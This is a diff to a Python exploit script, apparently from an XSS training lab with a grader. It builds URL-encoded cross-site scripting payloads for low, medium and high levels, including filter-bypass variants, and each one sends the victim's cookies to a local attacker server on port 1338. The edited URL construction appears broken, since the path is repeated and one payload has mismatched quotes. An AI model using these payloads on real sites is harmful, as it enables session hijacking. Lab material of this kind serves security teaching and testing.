@@ -26,11 +26,12 @@ def xss(vuln_type, level):
 
     if vuln_type == '1':
         if level == 'low':
-            url = TARGET_SERVER_ENDPOINT + '/xss/1/low?comment=%3Cscript%3Ewindow.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Flow%3Fcookie%3D%22%20%2B%20document.cookie%29%3C%2Fscript%3E'
+            comment = '/xss/1/low?comment=%3Cscript%3Ewindow.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Flow%3Fcookie%3D%22%20%2B%20document.cookie%29%3C%2Fscript%3E'
         elif level == 'medium':
-            url = TARGET_SERVER_ENDPOINT + '/xss/1/medium?comment=%3Cscri%3Cscript%3Ept%3Ewindow.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Fmedium%3Fcookie%3D%22%20%2B%20document.cookie%29%3C%2Fscript%3E'
+            comment = '/xss/1/medium?comment=%3Cscri%3Cscript%3Ept%3Ewindow.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Fmedium%3Fcookie%3D%22%20%2B%20document.cookie%29%3C%2Fscript%3E'
         else:
-            url = TARGET_SERVER_ENDPOINT + '/xss/1/high?comment=%3Csvg%2Fonload%3Dwindow.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Fmedium%3Fcookie%3D%22%20%2B%20document.cookie%29%3E'
+            comment = '/xss/1/high?comment=%3Cimg%20onload%3D%22window.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Fmedium%3Fcookie%3D%22%20%2B%20document.cookie%29%22%3E'
+        url = '/'.join([TARGET_SERVER_ENDPOINT, 'xss', vuln_type, level]) + '?comment=' + comment
         driver.get(url)
 
     # Grader verification should be done in attacker_server/server.py
